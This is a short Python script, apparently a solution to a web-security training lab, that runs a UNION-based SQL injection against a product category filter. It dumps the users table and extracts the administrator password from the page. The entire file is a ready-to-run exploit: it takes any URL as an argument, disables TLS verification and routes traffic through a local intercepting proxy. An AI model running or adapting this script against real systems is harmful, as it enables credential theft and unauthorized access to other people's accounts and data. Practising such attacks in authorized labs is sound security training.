import requests
import sys
import urllib3

from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FAIL = -1

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

def get_exploit_administrator_password(url):
    username = 'administrator'
    path = '/filter?category=Gifts'
    sql_payload = "' UNION select username, password from users--"
    response = requests.get(
        url + path + sql_payload,
        verify=False,
        proxies=proxies)
    if username in response.text:
        html = BeautifulSoup(
            response.text,
            'html.parser')
        password = html.body.find(
            string=username).parent.find_next(
            'td').contents[0]
        return password
    raise ValueError("Could not find the administrator password.")

if __name__ == "__main__":
    try:
        url = sys.argv[1]
        print("[+] Dumping the list of usernames and passwords...")
        administrator_password = get_exploit_administrator_password(url)
        print("[+] The administrator password is '%s'" % administrator_password)
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(FAIL)
    except Exception as exception:
        print("An exception occured %s" % exception)
        print("[-] The SQLi attack was not successful.")
        sys.exit(FAIL)     